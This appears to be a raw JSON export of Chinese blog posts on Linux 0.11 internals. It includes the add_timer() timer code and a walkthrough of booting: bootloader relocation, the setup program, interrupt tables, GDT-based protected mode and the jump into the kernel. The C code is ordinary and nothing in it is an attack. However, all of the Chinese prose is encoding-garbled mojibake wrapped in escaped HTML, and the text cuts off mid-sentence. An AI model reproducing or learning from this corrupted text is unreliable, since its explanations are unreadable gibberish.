\u003ccode\u003edo_timer()\u003c/code\u003e å‡½æ•°ä¸­ä¹Ÿçœ‹è¿‡äº†æ¯æ¬¡æ—¶é’Ÿä¸­æ–­ï¼Œéƒ½ä¼šæ£€æŸ¥ä¸€éå®šæ—¶å™¨ï¼Œå¹¶å†³å®šæ˜¯å¦è§¦å‘é¢„ç½®çš„å®šæ—¶å™¨å¤„ç†å‡½æ•°ã€‚\u003c/p\u003e\n\u003cp\u003eå½“ç„¶äº†ï¼Œæ—¢ç„¶æ˜¯è§¦å‘å®šæ—¶å™¨ï¼Œæ€»æ˜¯è¦æœ‰ä¸€ä¸ªå‰æâ€”â€”è®¾ç½®å®šæ—¶å™¨\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003evoid add_timer(long jiffies, void (*fn)(void))\n{\n    struct timer_list * p;\n\n    if (!fn)\n        return;\n    cli();\n    if (jiffies \u0026#x3C;= 0)\n        (fn)();\n    else {\n        for (p = timer_list ; p \u0026#x3C; timer_list + TIME_REQUESTS ; p++)\n            if (!p-\u003efn)\n                break;\n        if (p \u003e= timer_list + TIME_REQUESTS)\n            panic(\"No more time requests free\");\n        p-\u003efn = fn;\n        p-\u003ejiffies = jiffies;\n        p-\u003enext = next_timer;\n        next_timer = p;\n        while (p-\u003enext \u0026#x26;\u0026#x26; p-\u003enext-\u003ejiffies \u0026#x3C; p-\u003ejiffies) {\n            p-\u003ejiffies -= p-\u003enext-\u003ejiffies;\n            fn = p-\u003efn;\n            p-\u003efn = p-\u003enext-\u003efn;\n            p-\u003enext-\u003efn = fn;\n            jiffies = p-\u003ejiffies;\n            p-\u003ejiffies = p-\u003enext-\u003ejiffies;\n            p-\u003enext-\u003ejiffies = jiffies;\n            p = p-\u003enext;\n        }\n    }\n    sti();\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eå°ç»“\u003c/h2\u003e\n\u003cp\u003eå¯¹äºä»»åŠ¡è°ƒåº¦ï¼Œæ›´éš¾çš„æ˜¯å¯¹ä¸€ä¸ªæ—¶é—´æ–­å±‚çš„ç†è§£ã€‚åœ¨è°ƒåº¦è¿‡ç¨‹ä¸­ï¼Œæ—§ä»»åŠ¡è¢«æš‚åœï¼Œæ–°çš„ä»»åŠ¡è¢«é‡æ–°å¯åŠ¨, ç›´åˆ°æ—§çš„ä»»åŠ¡åˆè¢«å¯åŠ¨ã€‚è¿™é‡Œå°±å¿…é¡»äººä¸ºåœ°å°†è¢«ä¸­æ–­çš„ä»»åŠ¡ä¸»åŠ¨çš„è¿æ¥èµ·æ¥çœ‹å¾…ã€‚\u003c/p\u003e\n\u003cp\u003eæ—©æœŸç‰ˆæœ¬çš„ä»»åŠ¡è°ƒåº¦æ¨¡å—ç¡®å®æ¯”è¾ƒç®€å•ï¼Œç´¯è®¡ä¸è¿‡ç™¾è¡Œ C ä»£ç ã€‚å“ˆå“ˆã€‚ä¸€ç‚¹ä¸€ç‚¹ç»§ç»­æ¥å§ã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-plain\"\u003e  __                    __                  \n / _| __ _ _ __   __ _ / _| ___ _ __   __ _ \n| |_ / _` | '_ \\ / _` | |_ / _ \\ '_ \\ / _` |\n|  _| (_| | | | | (_| |  _|  __/ | | | (_| |\n|_|  \\__,_|_| |_|\\__, |_|  \\___|_| |_|\\__, |\n                 |___/                |___/ \n\u003c/code\u003e\u003c/pre\u003e","digest":"\u003cp\u003eå‰é¢å‡ èŠ‚å·²ç»æè¿°è¿‡ï¼Œå¯¹äºå•æ ¸ CPU æ¥è¯´ã€‚CPU å°±å¤„äºä¸æ–­åœ°æ‰§è¡ŒæŒ‡ä»¤çš„è¿‡ç¨‹(æˆ–è€…é€šè¿‡ \u003ccode\u003ehlt\u003c/code\u003e æŒ‡ä»¤ç›´æ¥åœæ­¢å·¥ä½œ)ã€‚\u003c/p\u003e\n\u003cp\u003eé’ˆå¯¹äºæ¯ä¸€ä¸ªç¨‹åºæ¥è¯´ï¼Œè¿™ä¸ªç¨‹åºæ‰§è¡Œæµç¨‹æ˜¯é€šè¿‡ CPU ä¸­å‡ ç»„å¯„å­˜å™¨(é€šç”¨å¯„å­˜å™¨ã€æ®µå¯„å­˜å™¨ã€æ§åˆ¶å¯„å­˜å™¨ç­‰) å’Œå­˜å‚¨åœ¨å†…å­˜ä¸­çš„ä»£ç å’Œæ•°æ®åä½œå®Œæˆçš„ã€‚\u003c/p\u003e\n\u003cp\u003eå¦‚æœè¦è¾¾åˆ°å•æ ¸å¤šä»»åŠ¡çš„ç›®çš„ï¼Œé¦–å…ˆè¦åšçš„å°±æ˜¯å®Œæˆå¯¹å‡ ç»„å¯„å­˜å™¨ä¸­å½“å‰å€¼çš„ä¿å­˜(æˆ‘ç§°ä¹‹ä¸ºä¿å­˜ç°åœº)ã€‚è€Œå¯¹äºå†…å­˜æ¥è¯´ï¼Œå¤šä¸ªä»»åŠ¡çš„ä»£ç ã€æ•°æ®åŒæ—¶å­˜åœ¨å†…å­˜æ˜¯å®Œå…¨åˆç†ä¸”å¯è¡Œçš„ã€‚æ¯•ç«Ÿç›¸è¾ƒäºæœ‰é™çš„å¯„å­˜å™¨ï¼Œå†…å­˜å®åœ¨æ˜¯å¤ªå¤§äº†(ç›¸å¯¹è€Œè¨€)ã€‚\u003c/p\u003e"},{"url":"2018-10-06-understand-Kernel-3","fileName":"2018-10-06-understand-Kernel-3.md","title":"ç†è§£ Linux Kernel (3) - æ“ä½œç³»ç»Ÿå¯åŠ¨","author":"fangfeng","date":"2018-10-06T00:00:00.000Z","tags":["Kernel","Linux","OS"],"content":"\u003cp\u003eè¿™æ¬¡æ‹–å¾—æœ‰å¤Ÿä¹…çš„ï¼Œæ¯•ç«Ÿéœ€è¦å°†çŸ¥è¯†ä¸²è”èµ·æ¥å¹¶ä¸æ˜¯ä¸€ä»¶å®¹æ˜“çš„äº‹æƒ…ã€‚æ›´ä½•å†µå¾ˆå¤šå†…å®¹å¯ä»¥è¯´å’Œå¸¸ç†(ä¸ªäººç†è§£çš„å¸¸ç†)æœ‰äº†æ¯”è¾ƒå¤§çš„åå·®ã€‚\u003c/p\u003e\n\u003cp\u003eä¸è¿‡ç¡®å®æ¯”è¾ƒæœ‰æ„æ€ã€‚ä»å¼•å¯¼ç¨‹åºåˆ°æ“ä½œç³»ç»Ÿå¯åŠ¨ï¼Œè¿™ä¸­é—´ç©¶ç«Ÿç»å†äº†å¤šå°‘æµç¨‹å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eç”±äºæœ‰äº†å‰å‡ èŠ‚çš„å†…å®¹ï¼Œè¿™é‡Œä¸ä¼šå†å¯¹å¼•å¯¼ç¨‹åºåŠæ±‡ç¼–è¯­æ³•åšè¿‡å¤šçš„ä»‹ç»ã€‚è€Œç€é‡åœ¨äºæ•´ä¸ªæµç¨‹çš„æè¿°ã€‚\u003c/p\u003e\n\u003ch2\u003eå¼•å¯¼ç¨‹åº\u003c/h2\u003e\n\u003cp\u003eä» BIOS å°†512å­—èŠ‚é•¿çš„å¼•å¯¼ç¨‹åºåŠ è½½åˆ°ç‰©ç†å†…å­˜\u003ccode\u003e0x7c00\u003c/code\u003eå¼€å§‹çš„è¿ç»­é€’å¢ç©ºé—´åï¼Œå³å°†ç¨‹åºçš„æ‰§è¡Œæƒäº¤ç»™äº†å¼•å¯¼ç¨‹åº(è¿™é‡ŒæŒ‡çš„æ‰§è¡Œæƒå¯ä»¥ç®€å•ç†è§£æˆCS:IP)\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cem\u003eCS:IP\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCS\u003c/strong\u003e. ä»£ç æ®µåŸºå€ã€‚ä¸€èˆ¬ç”¨äºåˆ’å®šä¸€æ®µè¿ç»­ä»£ç å¼€å§‹çš„åœ°å€ã€‚æ˜¯ä¸€ä¸ª16ä½æ®µå¯„å­˜å™¨ï¼Œç±»ä¼¼çš„è¿˜æœ‰ DS, ES, FS, GS, SS ç­‰16ä½æ®µå¯„å­˜å™¨ï¼Œåˆ†åˆ«æä¾›ä¸åŒçš„æ®µåŸºå€å­˜å‚¨åŠŸèƒ½)\n\u003cstrong\u003eIP\u003c/strong\u003e. ä»£ç æ®µåç§»å€¼ã€‚é…åˆ CS å…±åŒä¸º CPU ç¡®å®šä¸‹ä¸€ä¸ªå°†è¦è¢«æ‰§è¡Œçš„æœºå™¨æŒ‡ä»¤çš„çº¿æ€§åœ°å€ã€‚\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eLinux 0.11 ç‰ˆæœ¬çš„å¼•å¯¼ç¨‹åºå®ç°çš„æ”¯æŒæ¯”è¾ƒç®€å•ã€‚\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eå°†å¼•å¯¼ç¨‹åºä»£ç (è‡ªèº«) 512 å­—èŠ‚çš„å†…å®¹ç§»åŠ¨åˆ° \u003ccode\u003e0x90000\u003c/code\u003e å¼€å§‹çš„ 512B å†…å­˜ç©ºé—´ä¸Š\u003c/li\u003e\n\u003cli\u003eè·³åˆ° \u003ccode\u003e0x90000\u003c/code\u003e å¼€å§‹çš„æ®µçš„ç›¸åº”ä½ç½®ç»§ç»­æ‰§è¡Œ\u003c/li\u003e\n\u003cli\u003eä»ç£ç›˜ä¸­è¯»å– 4*512 å­—èŠ‚çš„ setup ç¨‹åºçš„äºŒè¿›åˆ¶å†…å®¹\u003c/li\u003e\n\u003cli\u003eè¯»å–æ“ä½œç³»ç»Ÿçš„äºŒè¿›åˆ¶å†…å®¹åˆ°å†…å­˜ \u003ccode\u003e0x10000\u003c/code\u003e å¼€å§‹çš„è¿ç»­åœ°å€ç©ºé—´ä¸­ (æ­¤å¤„æœ€å¤§å¯ä»¥æœ‰ 0x90000 - 0x10000 = 0x80000 = 512 KBï¼Œå³å½“æ—¶çš„æ“ä½œç³»ç»ŸäºŒè¿›åˆ¶ç¨‹åº+æ•°æ®æœ€å¤§åªèƒ½æ˜¯ 512KB, ä¸è¿‡ä¹Ÿå¾ˆå¤šäº†)\u003c/li\u003e\n\u003cli\u003eç¡®è®¤å°†è¦ä½œä¸ºæ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜æ˜¯å¦å­˜åœ¨\u003c/li\u003e\n\u003cli\u003eå°†æ§åˆ¶æƒäº¤ç»™ setup ç¨‹åº\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eSETUP ç¨‹åº\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eè¯»å–ç¡¬ä»¶é…ç½®\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003esetup ç¨‹åºï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯åœ¨æä¸€äº›é…ç½®ã€‚é‚£ä¹ˆç©¶ç«Ÿåœ¨é…ç½®ä»€ä¹ˆï¼Ÿ\u003c/p\u003e\n\u003cp\u003eå°±æ˜¯é€šè¿‡ BIOS ä¸­æ–­è¯»å–å„ç§ç¡¬ä»¶ä¿¡æ¯(è¯¸å¦‚å†…å­˜å¤§å°ï¼Œæ˜¾ç¤ºå™¨é•¿å®½æ¯”ï¼Œç£ç›˜ç­‰)ï¼Œå¹¶å°†å®ƒä»¬å­˜å‚¨åœ¨å†…å­˜çš„æŒ‡å®šä½ç½®ã€‚\u003c/p\u003e\n\u003cp\u003eå“ˆå“ˆï¼Œç”±äºå¼•å¯¼ç¨‹åºå·²ç»æ‰§è¡Œå®Œäº†ï¼Œå†ä¹Ÿä¸ä¼šä½¿ç”¨äº†ã€‚å› æ­¤ï¼Œsetup ç¨‹åºå°±æ˜¯å°†è¿™äº›ä¿¡æ¯å­˜å‚¨åˆ°äº†åŸå¼•å¯¼ç¨‹åºæ‰€åœ¨çš„ä½ç½®ï¼Œå³ 0x90000 ~ 0x901FF å…± 512 B çš„å†…å­˜ä¸­ã€‚\u003c/p\u003e\n\u003cp\u003eå½“ç„¶ï¼Œæ¯ä¸ªå­—èŠ‚å­˜çš„æ˜¯ä»€ä¹ˆå†…å®¹éƒ½æ˜¯ä¸€ç§çº¦å®š(æ¯”å¦‚ setup ç¨‹åºæŠŠå†…å­˜å¤§å°çš„ä¿¡æ¯å­˜åˆ°äº†å“ªï¼Œåé¢å…¶å®ƒç¨‹åºå°±åˆ°ç›¸åº”çš„ä½ç½®å»å–)ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eç§»åŠ¨æ“ä½œç³»ç»Ÿç¨‹åº\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eOKï¼Œsetup ç¨‹åºä¹Ÿä¸æ˜¯ä»…ä»…åªå¹²è¿™ä¹ˆç‚¹äº‹æƒ…çš„ï¼Œä¸ç„¶è¦ 4*512 å­—èŠ‚å²‚ä¸æ˜¯å¤ªæµªè´¹äº†ï¼Œå“ªç”¨å¾—äº†è¿™ä¹ˆå¤šã€‚\u003c/p\u003e\n\u003cp\u003esetup è¿˜è¦è´Ÿè´£å°†æ“ä½œç³»ç»Ÿç¨‹åºç§»åŠ¨åˆ°\u003cem\u003eæ–¹ä¾¿\u003c/em\u003eçš„ä½ç½®ã€‚å‰é¢å°†æ“ä½œç³»ç»Ÿç¨‹åºåŠ è½½åˆ°äº†å†…å­˜ 0x10000 å¤„ï¼Œä¸»è¦æ˜¯ä¸ºäº†æš‚æ—¶ä¿æŒ BIOS ä¸­æ–­å‘é‡è¡¨ (ä½äº 0x0000 å¼€å§‹çš„è¿ç»­ 1024 B å†…å­˜ä¸­ï¼Œç”± BIOS ç¨‹åºåˆ›å»ºï¼Œç”¨äºå„ç§ä¸­æ–­è°ƒç”¨) ã€‚åœ¨ setup å†³å®šä¸å†ä½¿ç”¨ BIOS ä¸­æ–­ä¹‹åï¼Œå°±å·²ç»å¯ä»¥å®Œå…¨åºŸå¼ƒäº†ã€‚\u003c/p\u003e\n\u003cp\u003eå› æ­¤ï¼Œæ“ä½œç³»ç»Ÿç¨‹åºå°†ä» 0x10000 é¡ºæ¬¡ç§»åŠ¨åˆ° 0x00000 çš„ä½ç½®ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eé‡ç½®ä¸­æ–­\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eè½¯ä¸­æ–­ä¸ç¡¬ä¸­æ–­ï¼Œåº”è¯¥æ˜¯åœ¨è½¯ç¡¬ä»¶åˆ’åˆ†ä¸‹å”¯äºŒçš„ä¸¤ç§ä¸­æ–­å½¢å¼ã€‚è½¯ä¸­æ–­ä¸€èˆ¬é€šè¿‡æ±‡ç¼–æŒ‡ä»¤ \u003ccode\u003eINT {ä¸­æ–­å·}\u003c/code\u003e çš„å½¢å¼é€šè¿‡è½¯ä»¶æ‰§è¡Œçš„å½¢å¼äº§ç”Ÿï¼Œè€Œç¡¬ä¸­æ–­æ˜¯ç¡¬ä»¶ç”±äºæŸäº›é”™è¯¯æŒ‡ä»¤è€Œè‡ªåŠ¨äº§ç”Ÿçš„ä¸­æ–­ã€‚\u003c/p\u003e\n\u003cp\u003eå½“ç„¶ï¼Œè¿™äº›ä¸­æ–­éƒ½éœ€è¦ CPU è¿›è¡Œç›¸åº”çš„å¤„ç†ã€‚é‚£ä¹ˆï¼Œåœ¨ BIOS  ä¸­æ–­å‘é‡è¡¨è¢«è¦†ç›–äº†ä¹‹åï¼Œå¦‚ä½•æ¥å¤„ç†è¿™äº›ä¸­æ–­å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆï¼Œåœ¨ä¸Šä¸€æ­¥ \u003cstrong\u003eç§»åŠ¨æ“ä½œç³»ç»Ÿç¨‹åº\u003c/strong\u003e å¼€å§‹æ—¶ï¼Œå°±ç›´æ¥é€šè¿‡æ±‡ç¼–æŒ‡ä»¤ \u003ccode\u003ecli\u003c/code\u003e å¼ºåˆ¶ç¦æ­¢é™¤ \u003cem\u003eéå¯å±è”½ä¸­æ–­\u003c/em\u003e å¤–çš„æ‰€æœ‰ä¸­æ–­ï¼Œå› æ­¤ä¹Ÿå°±åŸºæœ¬ä¸è€ƒè™‘ä¸­æ–­çš„é—®é¢˜ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ï¼Œæ€»è¿˜å¾—è§£é™¤ç¦æ­¢å§ã€‚å› æ­¤ï¼Œsetup ç¨‹åºå°½å¿«åœ°é‡æ–°ç¼–åˆ¶äº†ç¡¬ä»¶ä¸­æ–­ï¼Œè¿›å…¥ä¿æŠ¤æ¨¡å¼ã€‚ä½¿ç”¨ä¿æŠ¤æ¨¡å¼ä¸‹çš„ä¸­æ–­æè¿°ç¬¦è¡¨æ¥æ›¿ä»£ BIOS ä¸­æ–­å‘é‡è¡¨ã€‚\u003c/p\u003e\n\u003cp\u003eè‡³äºå¦‚ä½•åˆ›å»ºä¸­æ–­æè¿°ç¬¦è¡¨ï¼Œå“ˆå“ˆï¼Œè¿™éƒ½æ˜¯ç›´æ¥åœ¨æ±‡ç¼–ç¼–ç¨‹çš„æ—¶å€™å†™å¥½çš„ã€‚ç›´æ¥åˆ’å‡ºäº†ä¸€å—åŒºåŸŸå†™ä¸Šäº†ä¸­æ–­æè¿°ç¬¦è¡¨çš„è¡¨é¡¹ï¼Œç„¶åä¸ setup ä»£ç ä¸€èµ·è¢«è¯»å–åˆ°äº†å†…å­˜çš„æŒ‡å®šä½ç½®ã€‚è‡³äºå”¯ä¸€è¦åšçš„ï¼Œå°±æ˜¯å°† IDTR (ä¸­æ–­æè¿°ç¬¦è¡¨å¯„å­˜å™¨) ä¿®æ”¹ä¸ºä¸­æ–­æè¿°ç¬¦è¡¨åœ¨å†…å­˜çš„å¼€å§‹åœ°å€ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eè¿›å…¥ä¿æŠ¤æ¨¡å¼\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆï¼Œç®€å•ä»‹ç»ä¸€ä¸‹å®æ¨¡å¼ \u0026#x26; ä¿æŠ¤æ¨¡å¼ã€‚\u003c/p\u003e\n\u003cp\u003eä¿æŠ¤æ¨¡å¼ä¸å®æ¨¡å¼çš„ä¸»è¦åŒºåˆ«ï¼Œå°±åœ¨äºä¸¤è€…çš„å†…å­˜å¯»å€æ–¹å¼ï¼Œå½’æ ¹ç»“åº•ä¹Ÿå°±æ˜¯æ®µå¯„å­˜å™¨å¦‚ä½•è¾…åŠ©å®Œæˆå†…å­˜åœ°å€å®šä½çš„é—®é¢˜ã€‚\u003c/p\u003e\n\u003cp\u003eå…ˆç®€å•çš„å›é¡¾ä¸‹å®æ¨¡å¼ä¸‹çš„å¯»å€æ–¹å¼\u003c/p\u003e\n\u003cp\u003eæ®µå¯„å­˜å™¨çš„å‡ºç°ï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯ä¸ºäº†å¯¹ 16 bit CPU ä¸‹å¯å¯»å€åœ°å€ä¸è¶³æ‰€ä½œå‡ºçš„è¡¥å……ã€‚\nè¯¸å¦‚ CS:IP = 0x07C0:0x0001 -\u003e 0x07C01 ã€‚é€šè¿‡CS:IP çš„é…åˆï¼Œç‰©ç†åœ°å€ = CS \u0026#x3C;\u0026#x3C; 4 + IP ï¼Œå°†åŸæœ¬ 128 KB çš„å¯å¯»å€ç©ºé—´æ‰©å±•åˆ° 0xFFFF:0xFFFF -\u003e 0x10FFFE çš„å¯»å€ç©ºé—´\u003c/p\u003e\n\u003cp\u003eè€Œä¿æŠ¤æ¨¡å¼çš„å‡ºç°ï¼Œä¹Ÿæ˜¯ç”±äºå®æ¨¡å¼ä¸‹çš„åœ°å€å¯»å€ä»ç„¶ä¸èƒ½æ»¡è¶³å¯¹å†…å­˜å¯»å€çš„éœ€æ±‚ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆä¿æŠ¤æ¨¡å¼ç©¶ç«Ÿå°†å¦‚ä½•è¿›è¡Œå¯»å€å‘¢ï¼Ÿç®€å•æ¥è¯´å°±æ˜¯é€šè¿‡æ–°å¢äº†ä¸€ä¸ªå¯„å­˜å™¨ GDTR (å…¨å±€æè¿°ç¬¦è¡¨å¯„å­˜å™¨ã€‚å½“ç„¶ï¼Œæš‚æ—¶ä¸è€ƒè™‘ LDTR) ç”¨æ¥å­˜å‚¨å…¨å±€æè¿°ç¬¦è¡¨(å…¨å±€æè¿°ç¬¦è¡¨æ˜¯ä¸€äº›åœ¨å†…å­˜ä¸­çš„æœ‰ç»“æ„çš„æ•°æ®) ï¼Œé‚£ä¹ˆç±»ä¼¼çš„ï¼Œæœ¬æ¥æ˜¯æ®µå¯„å­˜å™¨ä¸­æ˜¯è¡¨ç¤ºä¸€ä¸ªå†…å­˜æ®µåŸºå€ï¼Œç°åœ¨é€šè¿‡å€ŸåŠ©ä¸­é—´é¡¹ (GDTR) ï¼Œç”±å…¨å±€æè¿°ç¬¦è¡¨çš„æ¯ä¸€ä¸ªè¡¨é¡¹æ¥è¡¨ç¤ºæ¯ä¸€ä¸ªå†…å­˜æ®µåŸºå€ï¼Œä»è€Œè¾¾åˆ°åœ¨æœ€å¤§ 4GB çš„å†…å­˜ä¸­è¿›è¡Œå†…å­˜åœ°å€çš„å¯»å€ã€‚\u003c/p\u003e\n\u003cp\u003eè€Œä¸ä¸Šé¢çš„ä¸­æ–­æè¿°ç¬¦è¡¨ç±»ä¼¼çš„ï¼Œå…¨å±€æè¿°ç¬¦è¡¨ä¹Ÿæ˜¯ä»¥åŒæ ·çš„æ–¹å¼ï¼Œé¢„å…ˆå†™å¥½ï¼Œç„¶åè®¾ç½®ä¸€ä¸‹ GDTR å°± OK äº†ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eè½¬å…¥æ“ä½œç³»ç»Ÿç¨‹åº\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eæœ€åçš„æœ€åï¼Œå½“ç„¶æ˜¯æŠŠæ§åˆ¶æƒäº¤ç»™æ“ä½œç³»ç»Ÿç¨‹åºã€‚å³è·³è½¬åˆ°å†…å­˜ 0x00000 å¤„ã€‚å½“ç„¶ï¼Œç”±äºç°åœ¨å·²ç»å¤„äºä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œå› æ­¤ jmp æŒ‡ä»¤ç•¥æœ‰ä¸åŒã€‚ ä¸º \u003ccode\u003ejmpi 0, 8\u003c/code\u003eã€‚\u003c/p\u003e\n\u003cp\u003eç®€å•è§£é‡Šä¸€ä¸‹è¿™ä¸€æ¡æŒ‡ä»¤ \u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ejmpi\u003c/code\u003e æŒ‡ä»¤è¡¨ç¤ºè¿›è¡Œæ®µé—´è·³è½¬ã€‚(æ®µé—´è·³è½¬ä¸æ®µå†…è·³è½¬çš„åŒºåˆ«åœ¨äº: ç¨‹åºä»£ç çš„å¯»å€ä¸€èˆ¬é€šè¿‡ CS:IP é…åˆå®Œæˆï¼Œå¦‚æœæ˜¯æ®µå†…è·³è½¬ï¼Œåˆ™æ®µåŸºå€ä¸å˜ï¼Œå³ CS ä¸å˜ï¼Œåªéœ€è¦ç»™å‡º IP å³å¯ï¼›è€Œæ®µé—´è·³è½¬éœ€è¦åŒæ—¶ç»™å‡ºæ–°çš„æ®µåŸºå€(CS)å’Œæ–°çš„æ®µåç§»(IP)ã€‚\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e0\u003c/code\u003e è¿™é‡Œ 0 å°±è¡¨ç¤ºçš„æ˜¯æ®µåç§»ã€‚\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e8\u003c/code\u003e ä¿æŠ¤æ¨¡å¼ä¸‹çš„æ®µå¯„å­˜å™¨ä»¥ä¸€ç§ç‰¹æ®Šçš„æ–¹å¼æ¥é…åˆ GDTR/LDTR æ¥å®Œæˆå¯¹å…¨å±€/å±€éƒ¨æè¿°ç¬¦è¡¨é¡¹çš„å®šä½ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚æœ€åä¸¤ä½è¡¨ç¤ºç‰¹æƒçº§ï¼Œç”¨äºåŒºåˆ†ç”¨æˆ·æ€(11) or å†…æ ¸æ€(00) (Linux åªä½¿ç”¨äº†ä¸¤ä¸ªï¼Œè¿˜æœ‰ 01 å’Œ 10 ä¸ä½¿ç”¨)\u003c/p\u003e\n\u003cp\u003eç¬¬ä¸‰ä½è¡¨ç¤ºä½¿ç”¨ GDTR è¿˜æ˜¯ LDTR\u003c/p\u003e\n\u003cp\u003eé«˜ 13 ä½å…±åŒç»„æˆäº†å¯¹ GDTR/LDTR è¡¨é¡¹çš„æè¿°ï¼Œç©¶ç«Ÿä½¿ç”¨å“ªä¸€ä¸ªè¡¨é¡¹ã€‚å½“ç„¶ï¼Œè¿™é‡Œå…¶å®ä¹Ÿä¾§é¢åæ˜ äº†ï¼Œå…¶å®æ¯ä¸ªå…¨å±€æè¿°ç¬¦è¡¨/å±€éƒ¨æè¿°ç¬¦è¡¨æœ€å¤šåªèƒ½æœ‰ \u003cspan class=\"inlineMath\"\u003e\u003cspan class=\"katex\"\u003e\u003cspan class=\"katex-mathml\"\u003e\u003cmath\u003e\u003csemantics\u003e\u003cmrow\u003e\u003cmsup\u003e\u003cmn\u003e2\u003c/mn\u003e\u003cmn\u003e13\u003c/mn\u003e\u003c/msup\u003e\u003cmo\u003e=\u003c/mo\u003e\u003cmn\u003e8192\u003c/mn\u003e\u003c/mrow\u003e\u003cannotation encoding=\"application/x-tex\"\u003e2^{13} = 8192\u003c/annotation\u003e\u003c/semantics\u003e\u003c/math\u003e\u003c/span\u003e\u003cspan class=\"katex-html\" aria-hidden=\"true\"\u003e\u003cspan class=\"base\"\u003e\u003cspan class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"\u003e\u003c/span\u003e\u003cspan class=\"mord\"\u003e\u003cspan class=\"mord\"\u003e2\u003c/span\u003e\u003cspan class=\"msupsub\"\u003e\u003cspan class=\"vlist-t\"\u003e\u003cspan class=\"vlist-r\"\u003e\u003cspan class=\"vlist\" style=\"height:0.8141079999999999em;\"\u003e\u003cspan style=\"top:-3.063em;margin-right:0.05em;\"\u003e\u003cspan class=\"pstrut\" style=\"height:2.7em;\"\u003e\u003c/span\u003e\u003cspan class=\"sizing reset-size6 size3 mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e1\u003c/span\u003e\u003cspan class=\"mord mtight\"\u003e3\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"\u003e\u003c/span\u003e\u003cspan class=\"mrel\"\u003e=\u003c/span\u003e\u003cspan class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"base\"\u003e\u003cspan class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"\u003e\u003c/span\u003e\u003cspan class=\"mord\"\u003e8\u003c/span\u003e\u003cspan class=\"mord\"\u003e1\u003c/span\u003e\u003cspan class=\"mord\"\u003e9\u003c/span\u003e\u003cspan class=\"mord\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e ä¸ªè¡¨é¡¹ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://ws4.sinaimg.cn/large/006tNbRwgy1fulm7vumywj31220aw74f.jpg\"\u003e\u003c/p\u003e\n\u003ch2\u003eæ“ä½œç³»ç»Ÿç¨‹åº\u003c/h2\u003e\n\u003cp\u003eç»ˆäºè¦åˆ°æ“ä½œç³»ç»Ÿç¨‹åºäº†ã€‚è¿™ä¸ªå°±æ¯”è¾ƒå¤æ‚äº†ã€‚è¿™é‡Œåªç®€å•æè¿°å°†æ“ä½œç³»ç»Ÿå¯åŠ¨èµ·æ¥çš„æœ€åŸºæœ¬ä½¿ç”¨åˆ°çš„ä»£ç ã€‚å…¶å®ƒä»¥åç»§ç»­ã€‚\u003c/p\u003e\n\u003cp\u003eå…¶å®æ•´ä¸€ä¸ªæ“ä½œç³»ç»Ÿç¨‹åºæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤§çš„é‡ï¼Œæ¯•ç«Ÿæœ€å¤§èƒ½å¤Ÿè¾¾åˆ° 512 KB å‘¢ã€‚\u003c/p\u003e\n\u003cp\u003eç®€å•çš„çœ‹ä¸€ä¸‹æ–‡æ¡£æ ‘ï¼Œè§é™„å½•ä¸€ï¼Œç¼–è¯‘å‰çš„æºä»£ç æ–‡ä»¶æ€»è®¡ 100 å¤šä¸ªã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆè¢«æ‰§è¡Œçš„æ˜¯ head.s ä¸­çš„ä»£ç ï¼Œè¿™é‡Œå®Œæˆçš„å·¥ä½œä¸»è¦åŒ…æ‹¬:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eé‡æ–°ç¼–åˆ¶æ¯ä¸ªä¸­æ–­çš„å…·ä½“å¤„ç†ä»£ç (è¿™ä¸ªåº”è¯¥æ¯”è¾ƒå¥½ç†è§£ï¼Œè¯´åˆ°åº•ä¸­æ–­å‡ºç°äº†ï¼Œä¹Ÿè¿˜æ˜¯è¦é€šè¿‡å®ç°ä»£ç æ¥å®Œæˆä¸­æ–­é€»è¾‘ã€‚ä¸è®ºæ˜¯ BIOS 